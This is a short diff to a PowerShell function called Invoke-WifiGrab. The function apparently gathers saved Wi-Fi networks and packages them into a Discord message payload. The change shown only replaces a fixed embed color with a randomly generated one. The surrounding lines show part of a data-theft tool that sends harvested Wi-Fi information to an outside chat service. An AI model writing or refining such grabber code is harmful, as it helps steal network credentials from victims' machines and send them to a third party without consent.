@@ -43,6 +43,9 @@ function Invoke-WifiGrab {
     # Convert the list to a string for the Discord message
     $formattedWiFiString = $formattedWiFiList -join "`n"
 
+    # Generate random RGB color and convert it to decimal
+    $randomColor = Get-Random -Minimum 0x000000 -Maximum 0xFFFFFF
+
     # Prepare JSON payload
     $jsonData = @{
         content = $null
@@ -50,7 +53,7 @@ function Invoke-WifiGrab {
             @{
                 title = "Wi-fi List:"
                 description = $formattedWiFiString
-                color = 1422226
+                color = $randomColor
             }
         )
         attachments = @()
